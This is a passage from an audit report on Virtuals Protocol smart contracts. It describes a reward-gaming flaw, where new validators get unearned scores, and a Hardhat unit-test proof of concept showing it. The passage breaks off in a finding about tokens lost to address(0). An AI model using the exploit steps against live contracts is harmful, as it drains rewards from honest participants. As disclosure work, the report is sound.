class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimepoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_baseValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] + \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getPastScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimepoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L49\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L49\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eIn AgentRewardV2, rewards are distributed based on participation rate calculated as \u003ccode\u003e(validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals\u003c/code\u003e, meaning validators with artificially inflated scores receive unearned rewards.\u003c/p\u003e\n\u003cp\u003eThis allows two exploit scenarios:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eNew validators can earn full rewards without ever voting on proposals:\nWithout actually casting votes, a new validator is already entitled to rewards, because their score is non-zero. This is unfair to other validators who might have started voting from the beginning but missed 1 proposal. (See POC)\u003c/li\u003e\n\u003cli\u003eStakers can game the system by delegating to new validators to maintain 100% reward allocation:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eIn addition to the first scenario above, a staker can delegate to a new validator every time to earn 100% uptime without ever having to vote. \u003c/p\u003e\n\u003ch3 id=\"impacts\" style=\"position:relative;\"\u003e\u003ca href=\"#impacts\" aria-label=\"impacts permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpacts\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eNew validators can earn full rewards without ever voting on proposals.\u003c/li\u003e\n\u003cli\u003eStakers can game the system by delegating to new validators to maintain 100% reward allocation.\u003c/li\u003e\n\u003cli\u003eUnfair reward distribution that penalizes validators who have actively participated since the beginning.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003evalidatorScore\u003c/code\u003e and \u003ccode\u003egetPastValidatorScore\u003c/code\u003e should be based on actual engagement. For example, consider initializing them to 0 and only taking into account scores earned during their engagement.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eUnit test on exploit scenario (1). Suppose 2 proposals are created. validator 1 votes for the 1st proposal: \u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003evalidator2\u003c/code\u003e is initialized. \u003ccode\u003evalidator2\u003c/code\u003e’s \u003ccode\u003eweight == validator1\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eCheck \u003ccode\u003evalidator2\u003c/code\u003e’s score is 2. (100% uptime). Check \u003ccode\u003evalidator1\u003c/code\u003e’s score is 1. 50% uptime.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eSee added unit test \u003ccode\u003evalidators get unearned score, risk of exploits\u003c/code\u003e in \u003ccode\u003etest/rewardsV2.js\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it.only(\u0026quot;validators get unearned score, risk of exploits\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(120000); // 120 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    //Test setup: 2 proposal are created. validator 1 votes for the 1st proposal.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    //1. validator2 is initialized. validator2\u0026#39;s weight == validator1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    //2. check validator2\u0026#39;s score is 2. (100% uptime). check validator1\u0026#39;s score is 1. 50% uptime.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await loadFixture(deployWithAgent);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentNft, virtualToken, agent } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder, contributor1, validator1, validator2 } =\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setup - delegate founder\u0026#39;s votes to validator1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const veToken = await ethers.getContractAt(\u0026quot;AgentVeToken\u0026quot;, agent.veToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await veToken.connect(founder).delegate(validator1.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await mine(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Create first proposal and have validator1 vote on it\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const proposalId1 = await createContribution(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1, // virtualId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // coreId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // parentId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true, // isModel\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // no dataset dependency\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;First contribution\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor1.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [validator1], // Only validator1 votes on this proposal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Create second proposal but nobody votes on it yet\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const proposalId2 = await createContribution(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1, // virtualId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // coreId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // parentId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true, // isModel\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // no dataset dependency\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Second contribution\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor1.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [], // No votes\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// - There are 2 total proposals\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // - validator1 has voted on 1 of 2 (50% participation)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 1. initialize validator2 with equal weight\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Give validator2 some tokens and stake them to get equal voting power\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(validator2.address, parseEther(\u0026quot;100000\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Register validator2 as a new validator\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.addValidator(1, validator2.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 2. Check validator scores\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator1Score = await agentNft.validatorScore(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      validator1.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator2Score = await agentNft.validatorScore(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      validator2.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const totalProposals = await agentNft.totalProposals(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Total proposals:\u0026quot;, totalProposals.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator1 score:\u0026quot;, validator1Score.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator2 score:\u0026quot;, validator2Score.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Validator1 has base score + 1 vote (has actually participated)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(totalProposals).to.equal(2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(validator1Score).to.equal(1); // participation (1)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(validator2Score).to.equal(2); // validator2 has base score (2) with no participation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Calculate uptime percentages\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator1Uptime = (validator1Score * 100n) / totalProposals;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator2Uptime = (validator2Score * 100n) / totalProposals;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator1 uptime percentage:\u0026quot;, validator1Uptime, \u0026quot;%\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator2 uptime percentage:\u0026quot;, validator2Uptime, \u0026quot;%\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // We expect validator2\u0026#39;s uptime percentage to be 100% despite not voting on any proposals\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(validator2Uptime).to.equal(100);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTest results:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  RewardsV2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTotal proposals: 2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator1 score: 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator2 score: 2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator1 uptime percentage: 50n %\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator2 uptime percentage: 100n %\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ✔ validators get unearned score, risk of exploits (1547ms)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1 passing (2s)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0\" style=\"position:relative;\"\u003e\u003ca href=\"#h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0\" aria-label=\"h 06 missing prevagentidupdate in promptmulti function may cause token loss by transferring to address0 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-182\"\u003e[H-06] Missing \u003ccode\u003eprevAgentId\u003c/code\u003eupdate in \u003ccode\u003epromptMulti()\u003c/code\u003e function may cause token loss by transferring to \u003ccode\u003eaddress(0)\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-379\"\u003eVemus\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-656\"\u003e4ny0n3\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-578\"\u003ebareli\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-41\"\u003edjshan_eden\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-576\"\u003edustykid\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-828\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-191\"\u003eHeyu\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-34\"\u003eks__xxxxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-177\"\u003eodessos42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-73\"\u003eRaihan\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-95\"\u003esergei2340\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/AgentInference.sol#L80-L87\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/AgentInference.sol#L80-L87\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description\" aria-label=\"finding description permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003epromptMulti()\u003c/code\u003e function attempts to optimize token transfers by caching \u003ccode\u003eagentTba\u003c/code\u003e when the \u003ccode\u003eagentId\u003c/code\u003e remains unchanged. However, it fails to update \u003ccode\u003eprevAgentId\u003c/code\u003e inside the loop, which causes \u003ccode\u003eagentTba\u003c/code\u003e to remain outdated or uninitialized.\u003c/p\u003e\n\u003cp\u003eAs a result, if the first \u003ccode\u003eagentId\u003c/code\u003e equals the default \u003ccode\u003eprevAgentId\u003c/code\u003e (0), the contract never sets \u003ccode\u003eagentTba\u003c/code\u003e before the first transfer, causing a \u003ccode\u003esafeTransferFrom(sender, address(0), 